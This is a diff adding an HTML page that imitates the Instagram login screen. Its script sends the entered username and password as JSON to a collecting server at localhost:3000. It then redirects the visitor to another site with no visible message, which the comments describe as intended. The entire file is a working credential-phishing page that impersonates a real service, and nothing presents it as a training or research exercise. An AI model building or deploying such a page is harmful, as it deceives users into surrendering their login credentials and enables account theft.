@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Login</title>
+
+<style>
+  body {
+    background: #fafafa;
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+
+  .container {
+    width: 350px;
+  }
+
+  .box {
+    background: white;
+    border: 1px solid #dbdbdb;
+    padding: 40px;
+    text-align: center;
+  }
+
+  .logo {
+    font-size: 28px;
+    font-weight: bold;
+    margin-bottom: 20px;
+    font-family: cursive;
+  }
+
+  input {
+    width: 100%;
+    padding: 10px;
+    margin: 6px 0;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    background: #fafafa;
+  }
+
+  button {
+    width: 100%;
+    padding: 10px;
+    margin-top: 10px;
+    background: #0095f6;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight: bold;
+  }
+
+  button:disabled {
+    background: #b2dffc;
+  }
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <div class="box">
+    <div class="logo">Instagram</div>
+
+    <form id="form">
+      <input type="text" id="username" placeholder="Phone number, username, or email" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit" id="loginBtn">Log in</button>
+    </form>
+  </div>
+</div>
+
+<script>
+const form = document.getElementById("form");
+const btn = document.getElementById("loginBtn");
+
+form.addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  btn.disabled = true; // disable button (like Instagram)
+
+  const data = {
+    username: document.getElementById("username").value,
+    password: document.getElementById("password").value
+  };
+
+  fetch("http://localhost:3000/login", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(data)
+  })
+  .then(() => {
+    // ❌ No success or error message shown
+
+    // 🔄 Just reload or redirect silently
+    window.location.href = "https://example.com"; // change later
+  })
+  .catch(() => {
+    // Even on error → no visible message
+    btn.disabled = false;
+  });
+});
+</script>
+
+</body>
+</html>
